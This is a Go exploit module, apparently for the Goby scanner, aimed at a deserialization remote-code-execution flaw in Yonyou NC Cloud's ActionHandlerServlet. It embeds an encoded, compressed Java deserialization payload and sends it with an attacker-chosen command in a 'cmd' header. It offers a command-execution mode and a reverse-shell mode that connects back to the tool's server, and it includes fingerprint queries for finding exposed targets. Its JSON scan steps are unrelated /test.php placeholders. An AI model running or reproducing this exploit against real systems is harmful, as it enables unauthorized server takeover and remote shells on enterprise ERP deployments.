package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC ActionHandlerServlet Api Remote Code Execute Vulnerability",
    "Description": "<p>Yonyou NC Cloud is a commercial level enterprise resource planning cloud platform that provides comprehensive management solutions for enterprises, including financial management, procurement management, sales management, human resource management, and other functions, achieving digital transformation and business process optimization for enterprises.</p><p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "yonyou-NC-Cloud",
    "Homepage": "https://hc.yonyou.com/product.php?id=4",
    "DisclosureDate": "2023-08-20",
    "PostTime": "2023-08-20",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"../Client/Uclient/UClient.dmg\"",
    "GobyQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"../Client/Uclient/UClient.dmg\"",
    "Level": "3",
    "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.yonyougz.com/yonyou/yonyou-nc/\">http://www.yonyougz.com/yonyou/yonyou-nc/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "用友 NC ActionHandlerServlet 接口远程代码执行漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>用友 NC Cloud 是一种商业级的企业资源规划云平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，实现企业的数字化转型和业务流程优化。</p><p>用友 NC Cloud 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.yonyougz.com/yonyou/yonyou-nc/\" target=\"_blank\">http://www.yonyougz.com/yonyou/yonyou-nc/</a></p>",
            "Impact": "<p>用友 NC Cloud 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Yonyou NC ActionHandlerServlet Api Remote Code Execute Vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>Yonyou NC Cloud is a commercial level enterprise resource planning cloud platform that provides comprehensive management solutions for enterprises, including financial management, procurement management, sales management, human resource management, and other functions, achieving digital transformation and business process optimization for enterprises.</p><p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.yonyougz.com/yonyou/yonyou-nc/\" target=\"_blank\">http://www.yonyougz.com/yonyou/yonyou-nc/</a></p>",
            "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7437"
}`

	sendPayloadDWUIQOH := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/servlet/~ic/com.ufida.zior.console.ActionHandlerServlet")
		postConfig.FollowRedirect = false
		postConfig.VerifyTls = false
		postConfig.Header.Store("cmd", cmd)
		payload, _ := hex.DecodeString("1f8b080000000000000095590b7c14f59dfffe763799c966f26021810503e121e6b9018c296c108100124d02120442f031d94c9285cdce323b1b12b4a7adf43cabf55151443d6c6d6d7af5d16865897250a8a7f6b4f5fabad66befd1bb5eefbcbbd6daf31ebdf60afdfd6677934d58b4dde4f37ffedeafff7f669ef939f2e21666ecd587f440c20e47029bf5f840a761bfbce1130f3d3c7ea2d10d0cc70e6800e8aab5901f317ca369f507f4981e1a3002217370d08cc6b98f448c901d96f13e6364488f248cc0f6b0d1dbaec736466d6be493cf7ee7b1556717fcc805571bdc0c62c3d7268c1b227ab4bf614bcf5e466fe6ad413d66a324b52532353085e6615e73f7992673aff910ee8c1f68d30f8e305af4a7873f7e6ca4f4b01bd406a54f0fd9a6c57cebda9844438a44439a4443168986ed961e8df799d6a0613167e619fc109e7d89a8d08e075a06f470d4e8cd22b0ecf5233fab3a78c4e30275a3289cb513b751dffd878992b0d2281f244c36caa91d35bf7cbb71ce51973892dda7b032cdbfb7323cb3f5a89d4570d7d0fd33d6b99e3fec128b16843310fbf147700fc786d2de19340f8623113d203e8c87ac70cc0e6c30fac2d170b4bf25a2c7e36da6de6b5898fcfd61466e8d0e99fb0c2b4bac3bdf39bfef965bdf5ae982bb1b79e175563f1b776677aef82a0cb71bf680d9dba10f1a5343b0d3b658c0e66e06d9aa5bfae0f69198c1647cd9641cf1538e48930fc87a204dfefeb7763d511aaf8e64cc4d0ce7cb864be13f5dfe83e7defce6ee09afc04679bf616f304211dd327a1dab5a09513621969d2b94869c515cda99ceea1c877e66c4240aa3c68156c71f21631ade9c69782e1bae758d2c9cab7bfd33efcffe55bebafdc76961665ff7c6b9974f33cc72dae745053eedc5063c28cd61993ea4e2612fe6e188178fe0a8348f2a784cb61f57718f1795f85315c7543ca1e0332a3eabe249059f1384cfab784ac517148c16a21c5f94e6cf547c49c5d30a9e118067153ce7c59731a6e279052fa8f88a97a57d51481e57912cc0529c5030eee5fe25152fcbe649c1fb7315a7149c96e157559c517056c5d754bc220b7fa1e05591ed352f5ec749155f176a7fa9e20de9df54f10de9bf29cd5b2afe4afa6fa9f8760193fe8ef0f9ae34df93e95f2bf8be10fa81346fabf8948abf11097ea8e2475efc2dfe4e70ff5ec53fa8f8b18a7f54f04f5e6c15db6dc54f54fcb3f43f55f12f2afe55c53b2afecd8b7fc77f48f333053ff7e25dfcc28b6ebca7e297d2ffa734ef4bf35fb2f7dfd2fc8f170d42e37f85d3af54fc9f60ff5ac16f44c6fff7228cdf4af30b813d2723a739ef251049e3f2929b3cd2e4e5a5b36e052b43f98c400ac392aa52013321af4a852a69ac1e1529544c708563942b53089e9869d98499597bad51dbe8e7ca43c85fcd196faf21b8abaa77306c8bd96b1057762e901d89c11e4e60bd27c22bde8dc32123e6e438a120c2b5c1c912c2a55517f2acbe2019098a316c841236935afa211893820b0a635ac6101762c65c95033387563989b9ad4494d5e8341356c8d814169d94758d4ef5d370070e695442a51acd209f46336916efda0396a1f7c6352aa37285666b3487fc1acda57934b56a6d77e09a35ba842a349a4f0b58f201db6677e4dbbac52583fd3209bd2d118da64c9a6f0f84e34b9631a7013dda1b312cc2fc49b80eb333111ad8143622bd13a6d7a85224cbef8f983d7a84b5895966c888c7b9de128a270fe3b670dcd668212d1271178beec67e42218bb2cd88c7d885e2e2692ed268095d4a289d5e8d155aaad16554c55e67fccd861c0a53c052166626a1c15e0d9fc4dd1a55530d83c70dbbd3d6ed0493aea53a4add60a6788a0d4ff5842559678a6d0e86743b75cfe949f405d68fd846cb4022ba4fc39fe02e8d02d4405099b46cb0d65c1b355a26922bbde64e2b2c01367392d184e9d2ab8168d87468ae4ff4f589229e03961ed36839ee22544e334987696f3213d16cfbafa0cb156a2440a32ba889ed2067207baf326ada95d14424a2d147a88290b7587e1aada4551a0589e38f821aada62b098b3228e9b0ae1c30e376a51c91ba5d695896692dd4701b6ed7680d5da5d15a5aa7e163f8f8149ba7424eccc7dab7e010335c2b3f0df7e06e3685190f44f9e8546883461bc5239b4428f7817054ca81e32e573d8f674f77e3fa4438c20ed6e86adacc442beba3958d1ab50ab6ab21e4acd895acbf2b3e2024420a5da3d1b5d4c68ca93de36227063b437a346a580a7568b485b68aacd731ca1e5da36dd4a9d176ba5ea31d92313b79977689124a434f38da101f10e02e9e724405b80608f1dd99888d1a7643a719da67708477738433e81e8d6ea01b35ba89ae57e8668d7409fc1e5aa45048a35eaad7c890fceea37e8d06642f2ccc2a32f64f17a694edeb2a07e3fd95f56b34da2b4a731261e67440731f7be853b897e47c261485129665f00dcc710a615655f585d581f393d32735b9da32135c1dfc39e09c2d065619385d606756e52aa7a5595711a74810ea3fa4ae5a469f5cd31a1cf0e629ce9fb2c51a717ead0b4965093b95ca53b55b0e07b753cba694eff495aafac225761f83cb056eba45264ab21a32a3365fc559c979d944f97e6e751afb1306df919aabd9f3454ca9331133ac50ca249e78f8a0e11c59ad84b2aad69ceca55ca56e9184b5394c73e18d3197b1521498dc9c8bed713d0e3b77dd69e7535a901cf7db9ce28ac7d335cd5355ddbd9ebbed5d5b37724ee5f0be87756687645f26a75b7982f08cac48c948ac70b949b9a64c028ddd600cdb59b7fee9c199b5c514cb726eb01dd8677a242e2ec9a134fbd1c3961fe4638b25b6ecf8ceb03d300d3613b5bb9d533f16d145af0d178d8d8bc64cae68cb8bc722618edfcb7231ecce199f319dd39ecfaa8b48c9c1a738cfd05bfa08e553c370f286353b1b3573fa378bfbf21c3b4c3d4c47e2b631983aabb75a2687bc3dc233db6c330f18568b2e2777be1e8b19d1df23e1a79474d1c7363387f58c2922d9610905afdc0f3293b229fe4f2f338daaaa1ca6ca06dd9aba92344fe1915e4c15c1d6682cc137032e7783629d3472d86cc8da9084abcab92186d31271638311090ff2716f5dc4a359ef26d24751b373d38a7770a83bb5430232ea4c44aa8d52fd335229bdfc506999231771fc8e0fe439cd0c6a386aef90289118b910c949e41216604bc2ceb2cb9c2cbb64ef3804e32d11336ef4666e3a532dc4958f17c391d425d3933e9372d1e2083c90ba31e5f5451272a2e7c523861193fa728d8855600c8733b2e78584672a4ada5933bddfc0427eb8aa008b0f17fff19d459e5ae5b2c27d3eaff3b59ae79f00dc6f43c50cde7ca4e604681cae24dc6db549787c7949e4b7d7799250ea78ae9e4101ff77b89b3c659efad34fbaf6d697795604f3fc79af237fd4b5c3cfe0de60be3fdf579884f6288a7854e48c7877a5ec7a7cc5931465410d2a7ee52c4a1c9032bf2220a559204a1a44d667c8fa28ca83aa334f6226ffa7562f8496ad592984d234426a9e8370d9b4f533283f236cdc4d0565057ef525cc263c49a65f2d2b7809735c087afd5ec1f367e179855ea1bf50d6e7ba4f615e1297f80b795091c4fca096da58e0e18d2eb7afb2d3d9e55905cf16f26cfe1954068bfc4562489caff1b3d91625b13858ecd70471490af1055cea606a29cc9358da35035f3f81cb84c2ce1a5f5512d5c1127f491235ac5b89af363fc5afaeb3cb23b85d79290af57e25dfa1e02fe61d21e316225d7932f4179fce504c310fa498fb4bb279fb150762145b822535be65c2b8d45fea5beec970142ea59e0c17318232955c694e72b30f15d0e8b9bb47d99a6c09f7210f8dfef6a1e7393e8fe0493c051f5ec577f17df8e8946bb9ab919fe79bd0ecba87fb35e872fa3db8d5e96f73dd2ebdeb0ed75dce9cf0c71cf7efa2995b2f3c28e43f0d6528c25c14f3f37f2996710e346126539a858dbcb307e5e8c76c44300736fc9c4173f9016a1eeec3252ccd7c9667214bb400a3a8c43816e11416b37497b27c552ce152bc8dcbf01354e31dd4e03dd4e237e0c72cd4533102548106aac232ba1ccb692556d05a5c4e5d68a4db70051d4213dd8995f469aca25368a657b19abe812b5d2558e35a8e16d6fa2a5713d6bad6609deb46ac77dd8e0dae3b1070dd8556d67493eb5e6c763d8052d7115c8b3b595b0feb2efaf3135a2adfb18a7b37f7336ac7b162acddc9f8464ef02bc6184c10f27079da60c50ee0565eb98e8bc6b60982b2cf4f93dc0ac1e3bce6e17eb0f63568be2626f591a3c8f7ad1ce3d1aab65a5f3089e6a358c3035f5312ab7d5726b1a6bdee74de130c74d5584d9d7bc571acada9f3ac18c7ba71ac3f8e9693d8d0c5d56863477d129b7c578fd54ce06e76ba245ac7e4dd9c2364137b11d8c56d17fbb1dbf1dd7cdc803adc8815b8095740c76af4a0152156a1173b6030643f63df935181de60050ab8aff15d338e6b93686b7764a70e0a7aea7ced5cc68e626dadafc31954d6fab638856df6496ced3a81eb18769b8f43785b12dbdb38b72a9dbceef2f8aee7acaaed0c7a4671e50723ef988abc539077a591c7d1e5e732b3bbe324babbd8207b4ee006df8d49dc24b537899b8fa2507a7d1479bea6607e1aaa67122acdc89fcf4c2ec4487196c21d54ea5f83c2b821bf329622de1bcc9f58cb1f0baa1313f5ab6cb107718e0a38baa4af60eb1590cfe92b6881f469ff44396b807d6cdf0807d420fb28ca7966721ec510c07eac479cfd91608821ceb261a6760b1ec7ad780e1fc5d7f814fb1eaffe9acfaf73fc64c8114cf9b89db97e8c0af9c1dbc76be5bc3697c7153c5eccde2479fe4bfbf50e9652bebebc9ff1abe3cb47517a92edec334ea0af631445cea45f266c6b566f20c86531dc555b97c4de13d8c7a660fbef611371d7c3958c0d13e163856783c1029945f950e0ce7c14378b9563c750eaf7ca687f12d6e8f977e560492f2a938b6a7ab1404699453e4ae2fe026e66c11ec7903039b0530a62e1e8f963320b09a7612e3b1d69bffa46d8852cf54109a45b52ee1cf3dd3ac6693e8ed338cb0e02bec585a9618a43ee6547dcc7578407b8503dc8e5ef3097be87d08987395d8e208c47d83547d9fc8f31cee30c718c474fe08bf82c9ee5e2f7023ec7d49f62fa5f600ea37885775ec397f0269e665ecf31b767d871cf72e9fb3273bd8f2f1ba95a51c31545aa4c714dcd8b9cf42fa225898fee7c7e2258bc2c35f02227f3715eb9dfb9b43c60a3b0573e7f18ce23cdc4ab79d79095ba9fa73e0da42e6d9f79eff32b0f367f65bdf336de79775f95f39dbf10800c2e997cd52f83f917ff4220834553a19738d0254e0be73b1fd2dff9307ce187c1763d96a7fcf0ec2be5377fdb0dd72678e55ded26e7ab5a2b0ae49d667cc08cf40ec7d2344a0fa8d23ad486877f075694bf116d1c0000")
		postConfig.Data = string(payload)
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(10)
			resp, err := sendPayloadDWUIQOH(hostInfo, "echo "+checkString)
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, checkString) && len(resp.Utf8Html) < 15
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			// 默认为执行命令
			cmd := goutils.B2S(stepLogs.Params["cmd"])
			if attackType == "cmd" {
				resp, _ := sendPayloadDWUIQOH(expResult.HostInfo, cmd)
				if resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
					return expResult
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_java", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd = fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp)
				sendPayloadDWUIQOH(expResult.HostInfo, cmd)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
				return expResult
			}
			return expResult
		},
	))
}
